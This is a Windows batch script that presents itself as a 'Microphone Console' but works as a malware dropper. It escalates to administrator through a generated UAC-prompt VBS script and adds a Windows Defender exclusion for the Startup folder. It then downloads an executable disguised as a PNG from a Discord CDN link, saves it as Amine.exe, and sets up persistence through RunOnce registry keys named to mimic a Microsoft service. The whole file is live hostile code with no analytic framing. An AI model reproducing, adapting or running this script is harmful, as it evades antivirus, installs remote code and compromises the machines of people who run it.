@echo off
title Microphone Console

:a
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params=%*:"=""
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
timeout 2 /nobreak > nul

if exist "%temp%\tmp" (
    del "%temp%\tmp" /f /q & exit /b
) else (
    goto :a
)

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"
echo.>"%temp%\tmp"

powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'

powershell -Command "& { Invoke-WebRequest -UseBasicParsing -Uri 'https://cdn.discordapp.com/attachments/1137771634808332378/1197656655404478574/Creal.png' -OutFile \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Amine.exe\" }"

echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat" /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Aminebat" /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo start explorer.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.exe" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo exit >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"

powershell -Command "& { Invoke-Item \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat\" }"
